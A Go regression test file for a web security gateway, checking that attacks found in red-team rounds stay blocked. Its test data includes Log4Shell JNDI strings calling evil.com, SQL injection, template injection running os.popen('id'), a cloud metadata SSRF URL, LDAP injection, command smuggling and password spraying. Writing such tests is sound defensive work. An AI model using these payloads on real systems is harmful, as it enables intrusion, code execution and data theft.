package main

// Regression tests for the bypasses the red-team rounds found. Each test
// is an attack that once got through; it must stay stopped.

import (
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"net/url"
	"sentinel/gateway/internal/middleware"
	"strings"
	"testing"

	"sentinel/gateway/internal/config"
)

func redteam(c *config.Config) {
	c.TrustedProxies = "127.0.0.0/8"
	c.MLMode, c.MLThreshold = "block", 0.9
	c.LoginFailLimit = 10
	c.SecurityHeaders = true
	c.MaxBodyBytes = 1 << 20
}

func TestRedTeamRound1(t *testing.T) {
	l := newLabWith(t, redteam)
	n := 0
	next := func() []string { n++; return from(fmt.Sprintf("10.60.%d.%d", n/250, n%250+1)) }
	blocked := func(name string, code int) {
		t.Helper()
		if code < 400 {
			t.Errorf("%s: got through (%d)", name, code)
		}
	}
	pad := strings.Repeat("a", 1<<20+10)
	code, _ := l.do("POST", "/api/Feedbacks", "", `{"x":"`+pad+`","comment":"' UNION SELECT password FROM users--"}`, next()...)
	if code != 413 {
		t.Errorf("attack after 1 MB of padding: %d, want 413", code)
	}
	code, _ = l.do("POST", "/api/Feedbacks", "", strings.Repeat("[", 5000)+`"x"`+strings.Repeat("]", 5000), next()...)
	blocked("5000-level JSON", code)
	for name, h := range map[string][]string{
		"Log4Shell in User-Agent": {"User-Agent", "${jndi:ldap://evil.com/a}"},
		"obfuscated Log4Shell":    {"X-Api-Version", "${${lower:j}ndi:ldap://evil.com/a}"},
		"SQLi in a custom header": {"X-Api-Version", "' or 1=1--"},
		"SSTI in Referer":         {"Referer", "{{config.__class__.__init__.__globals__}}"},
		"metadata SSRF in X-Url":  {"X-Callback-Url", "http://169.254.169.254/latest/meta-data/"},
	} {
		code, _ := l.do("GET", "/", "", "", append(next(), h...)...)
		blocked(name, code)
	}
	req, _ := http.NewRequest("GET", l.gw.URL+"/", nil)
	req.Header.Set("Cookie", "lang={{7*7}}")
	req.Header.Set("X-Forwarded-For", "10.61.0.1")
	if resp, err := http.DefaultClient.Do(req); err == nil {
		blocked("SSTI probe in a cookie", resp.StatusCode)
		resp.Body.Close()
	}
	review := strings.Repeat("Great product, would buy again. The delivery was fast. ", 12)
	for name, p := range map[string]string{
		"SSTI diluted in a long review": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
		"JNDI diluted":                  "${jndi:ldap://evil.com/a}",
		"LDAP injection diluted":        "*)(uid=*))(|(uid=*",
	} {
		code, _ := l.do("POST", "/api/Feedbacks", "", `{"comment":"`+review+p+review+`"}`, next()...)
		blocked(name, code)
	}
	for i, trap := range []string{"/admin-backup;x=1", "/.env.bak", "/admin-backup.zip", "/%61dmin-backup", "/Admin-Backup/"} {
		ip := fmt.Sprintf("10.62.0.%d", i+1)
		l.do("GET", trap, "", "", from(ip)...)
		if code, _ := l.do("GET", "/", "", "", from(ip)...); code != 403 {
			t.Errorf("honeypot variant %s did not ban (%d)", trap, code)
		}
	}
	for _, q := range []string{"＇ ｕｎｉｏｎ ｓｅｌｅｃｔ password from users--", "1')) /*!50000UNION*/ /*!50000SELECT*/ password FROM users--", "1874\npwd"} {
		code, _ := l.do("GET", "/rest/products/search?q="+url.QueryEscape(q), "", "", next()...)
		blocked("encoded "+q, code)
	}
	many := make([]string, 2000)
	for i := range many {
		many[i] = fmt.Sprintf("f%d=v%d", i, i)
	}
	code, _ = l.do("POST", "/rest/user/login", "", "", append(next(), "Content-Type", "application/x-www-form-urlencoded")...)
	_ = code
	req, _ = http.NewRequest("POST", l.gw.URL+"/rest/user/login", strings.NewReader(strings.Join(many, "&")))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("X-Forwarded-For", "10.63.0.1")
	if resp, err := http.DefaultClient.Do(req); err == nil {
		blocked("2000 form fields", resp.StatusCode)
		resp.Body.Close()
	}
}

func TestPasswordSprayingIsLimitedPerAccount(t *testing.T) {
	l := newLabWith(t, redteam)
	var last int
	for i := 0; i < 14; i++ {
		last, _ = l.do("POST", "/__sentinel/auth/login", "", fmt.Sprintf(`{"username":"carol","password":"guess%d"}`, i), from(fmt.Sprintf("198.51.100.%d", i+1))...)
	}
	if last != 429 {
		t.Errorf("14 guesses on one account from 14 IPs: last answer %d, want 429", last)
	}
	// The real password is refused too while the account is paused...
	if code, _ := l.do("POST", "/__sentinel/auth/login", "", `{"username":"carol","password":"Carol#2026"}`, from("198.51.100.99")...); code != 429 {
		t.Errorf("paused account accepted a login: %d", code)
	}
	// ...but other accounts are not affected.
	if code, _ := l.do("POST", "/__sentinel/auth/login", "", `{"username":"admin","password":"Admin#2026"}`, from("198.51.100.98")...); code != 200 {
		t.Errorf("other account blocked: %d", code)
	}
}

func TestSpoofedClientHeaderIsRemoved(t *testing.T) {
	l := newLabWith(t, redteam)
	l.do("GET", "/staff/api/health", "", "", "X-Sentinel-Client", "payroll-service")
	if v := l.lastHdr.Get("X-Sentinel-Client"); v != "" {
		t.Errorf("app received a client-sent X-Sentinel-Client: %q", v)
	}
}

// Round 3: a megabyte-long username must not become a megabyte-long store
// key, and a text page can't be read in small ranges past the leak check.
func TestRedTeamRound3(t *testing.T) {
	l := newLabWith(t, redteam)
	long := strings.Repeat("a", 50000) // under the 64 KB field limit
	if code, _ := l.do("POST", "/__sentinel/auth/login", "", `{"username":"`+long+`","password":"x"}`); code != 400 {
		t.Errorf("giant username: %d", code)
	}
	r := httptest.NewRequest("GET", "/report", nil)
	r.Header.Set("Range", "bytes=0-20")
	var seen string
	h := middleware.ResponseGuard("block", 1<<20, slog.New(slog.NewTextHandler(io.Discard, nil)))(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		seen = r.Header.Get("Range")
	}))
	h.ServeHTTP(httptest.NewRecorder(), r)
	if seen != "" {
		t.Error("Range reached the app for a text page")
	}
	r = httptest.NewRequest("GET", "/videos/intro.mp4", nil)
	r.Header.Set("Range", "bytes=0-20")
	h.ServeHTTP(httptest.NewRecorder(), r)
	if seen != "bytes=0-20" {
		t.Error("Range removed for a video")
	}
}
